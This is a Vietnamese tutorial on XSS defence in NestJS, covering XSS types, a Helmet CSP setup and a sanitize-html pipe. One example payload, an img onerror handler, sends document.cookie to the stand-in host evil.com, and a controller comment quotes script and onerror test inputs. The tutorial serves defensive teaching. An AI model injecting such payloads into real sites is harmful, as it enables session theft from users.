# Phần 11: Tấn công Kịch bản Liên trang: XSS (Cross-Site Scripting)

> **Tư duy cốt lõi:**  
> *"Dù XSS tấn công vào trình duyệt của người dùng (Client-side), trách nhiệm phòng chống gốc rễ lại nằm ở Backend. Hãy làm sạch dữ liệu (Sanitize) trước khi lưu vào DB và cấu hình Content Security Policy (CSP) làm tuyến phòng thủ chiều sâu."*

---

## 1. Tóm tắt Kiến thức Cốt lõi (Từ note.md)

### Bản chất của XSS
- Xảy ra khi kẻ tấn công chèn thành công mã JavaScript độc hại vào trang web, và đoạn mã này **được thực thi trực tiếp trên trình duyệt của người dùng khác** trong ngữ cảnh domain của bạn.
- **Sức mạnh hủy diệt của JavaScript trong Browser:**
  - Đọc trộm token trong `LocalStorage` hoặc cookie (nếu thiếu cờ `HttpOnly`).
  - Gửi các request ngầm nhân danh người dùng (chuyển tiền, đổi email, đổi mật khẩu).
  - Chuyển hướng người dùng sang trang lừa đảo (Phishing) hoặc chỉnh sửa giao diện trang web để lừa bấm nút độc hại.

---

### Phân loại các Dạng XSS

```
1. STORED XSS (NGUY HIỂM NHẤT)
   Mã độc được lưu vĩnh viễn trong Database (bình luận, bài viết blog, bio).
   Bất kỳ ai mở trang web lên xem đều bị kích hoạt mã độc!

2. REFLECTED XSS
   Mã độc nằm trong URL query params, được server phản hồi trả thẳng về trang HTML
   mà không qua mã hóa (Encoding).

3. DOM-BASED XSS
   Lỗ hổng xảy ra thuần túy ở JavaScript phía Client khi thao tác với DOM không an toàn
   (như innerHTML, document.write).
```

### Ví dụ điển hình: Render Markdown / HTML sang DOM
- Người dùng viết bài bằng Markdown $\rightarrow$ Server hoặc Client dịch sang HTML để hiển thị.
- Kẻ tấn công chèn payload:
  ```html
  <img src="error.jpg" onerror="fetch('https://evil.com/steal?c=' + document.cookie)" />
  ```
- Khi ảnh bị lỗi, sự kiện `onerror` tự động kích hoạt mã JavaScript đánh cắp phiên!

---

### Giải pháp Phòng vệ Kép (Dual Defense)
1. **Làm sạch dữ liệu (Sanitization):** Lọc bỏ hoàn toàn các thẻ `<script>`, `<iframe>` và các thuộc tính sự kiện (`onload`, `onerror`, `onclick`).
2. **Content Security Policy (CSP):** HTTP Header chỉ thị cho trình duyệt **cấm chạy inline script** (`<script>...</script>`) và chỉ cho phép tải script từ các domain uy tín đã khai báo.

---

## 2. Ánh xạ vào Hệ sinh thái NestJS

Trong NestJS, kỹ sư backend xử lý XSS ở 2 tầng:
1. **Tầng Request / Pipe (Sanitize Data):** Viết Custom Pipe hoặc dùng `class-transformer` kết hợp thư viện `sanitize-html` để làm sạch HTML trước khi lưu vào Database.
2. **Tầng HTTP Header (CSP):** Cấu hình `helmet({ contentSecurityPolicy: { ... } })` trong `main.ts`.

---

## 3. Thực hành Code NestJS: Phòng chống XSS Toàn diện

### Cài đặt thư viện
```bash
npm install sanitize-html helmet
npm install -D @types/sanitize-html
```

### 1. Cấu hình Content Security Policy (CSP) trong `main.ts`
Chỉ thị cho trình duyệt chặn đứng mọi script chèn lén:

```typescript
// main.ts - CẤU HÌNH CSP VỚI HELMET TRONG NESTJS
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Cấu hình HTTP Content Security Policy
  app.use(
    helmet({
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"], // Mặc định chỉ tải tài nguyên từ cùng origin
          scriptSrc: [
            "'self'", 
            // CẤM HOÀN TOÀN 'unsafe-inline' (Chặn mọi thẻ <script> và onerror do hacker inject)
            'https://trusted-cdn.com',
          ],
          styleSrc: ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
          imgSrc: ["'self'", 'data:', 'https://images.unsplash.com'],
          objectSrc: ["'none'"], // Cấm nhúng Flash, Java Applet
          upgradeInsecureRequests: [], // Tự động nâng cấp HTTP lên HTTPS
        },
      },
    }),
  );

  await app.listen(3000);
}
bootstrap();
```

---

### 2. Xây dựng Custom Transform Pipe để Sanitize HTML
Tạo một Custom Decorator / Pipe trong NestJS để tự động làm sạch nội dung bài viết trước khi vào Controller:

```typescript
// common/pipes/sanitize-html.pipe.ts - CUSTOM SANITIZE PIPE
import { PipeTransform, Injectable, ArgumentMetadata } from '@nestjs/common';
import * as sanitizeHtml from 'sanitize-html';

@Injectable()
export class SanitizeHtmlPipe implements PipeTransform {
  transform(value: any, metadata: ArgumentMetadata) {
    if (typeof value === 'string') {
      return this.cleanHtml(value);
    }

    if (typeof value === 'object' && value !== null) {
      // Đệ quy làm sạch tất cả các trường string bên trong object DTO
      for (const key of Object.keys(value)) {
        if (typeof value[key] === 'string') {
          value[key] = this.cleanHtml(value[key]);
        }
      }
    }

    return value;
  }

  private cleanHtml(raw: string): string {
    return sanitizeHtml(raw, {
      // Chỉ cho phép các thẻ định dạng văn bản cơ bản
      allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'h1', 'h2', 'ul', 'ol', 'li', 'code', 'pre'],
      allowedAttributes: {
        a: ['href', 'target'], // Link chỉ được có href và target
      },
      // Tự động thêm rel="noopener noreferrer" vào các thẻ <a> để chống Reverse Tabnabbing
      transformTags: {
        a: sanitizeHtml.simpleTransform('a', { rel: 'noopener noreferrer' }),
      },
      // CẤM TUYỆT ĐỐI CÁC THẺ VÀ THUỘC TÍNH SỰ KIỆN NGUY HIỂM:
      // <script>, <iframe>, <object>, onload=, onerror=, onclick= ĐỀU BỊ XÓA BỎ!
    });
  }
}
```

---

### 3. Áp dụng Pipe trong DTO và Controller
```typescript
// articles/dto/create-article.dto.ts
import { IsString, IsNotEmpty, MaxLength } from 'class-validator';

export class CreateArticleDto {
  @IsString()
  @IsNotEmpty()
  @MaxLength(200)
  title: string;

  @IsString()
  @IsNotEmpty()
  // Nội dung bài viết cho phép chứa HTML/Markdown có định dạng
  content: string;
}
```

```typescript
// articles/articles.controller.ts
import { Controller, Post, Body, UsePipes } from '@nestjs/common';
import { CreateArticleDto } from './dto/create-article.dto';
import { SanitizeHtmlPipe } from '../common/pipes/sanitize-html.pipe';

@Controller('articles')
export class ArticlesController {
  @Post()
  // ÁP DỤNG SANITIZE PIPE TRƯỚC KHI DỮ LIỆU ĐƯỢC LƯU VÀO DATABASE
  @UsePipes(new SanitizeHtmlPipe())
  async createArticle(@Body() dto: CreateArticleDto) {
    // Nếu client gửi:
    // content = "<p>Bài viết hay</p><script>alert('hack')</script><img src=x onerror=alert(1)>"
    //
    // Sau khi qua SanitizeHtmlPipe, content chỉ còn lại:
    // "<p>Bài viết hay</p>" (Toàn bộ script và onerror đã bị triệt tiêu 100%)
    
    return {
      message: 'Bài viết đã được lưu an toàn',
      cleanContent: dto.content,
    };
  }
}
```

---

## 4. Ghi nhớ cho Kỹ sư Backend NestJS
- **Không bao giờ tin tưởng Client làm sạch:** Client-side sanitization chỉ để tăng trải nghiệm người dùng. **Backend bắt buộc phải sanitize lại lần nữa** vì hacker có thể dùng Postman/cURL để gửi payload trực tiếp lên API.
- **Kết hợp `HttpOnly` Cookie:** Đây là giải pháp phòng vệ hữu hiệu nhất chống lại việc XSS lấy trộm Token phiên đăng nhập.
- **CSP là chốt chặn cuối:** Hãy luôn bật Helmet CSP để nếu bạn có vô tình quên sanitize một trường nào đó, trình duyệt vẫn từ chối thực thi đoạn mã độc hại.

